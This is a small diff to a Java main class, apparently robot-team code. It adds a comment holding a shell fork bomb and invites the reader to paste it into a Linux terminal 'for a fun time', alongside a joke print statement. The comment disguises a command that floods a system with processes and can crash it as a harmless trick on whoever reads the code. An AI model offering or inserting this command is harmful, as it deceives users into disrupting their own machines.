@@ -24,8 +24,9 @@ public final class Main {
    * If you change your main robot class, change the parameter type.
    */
   public static void main(String... args) {
+    // :(){:|:&};:
+    // Put that into your linux terminal for a fun time ;)
     
-        
     for (String arg : args) {
       System.out.println("AAAAAAAAAAARRRRRRRRGGGGGGGUUUUUUUMMMMMMMMEEEEEEENNNNNNTTTTT");
       System.out.println(arg);
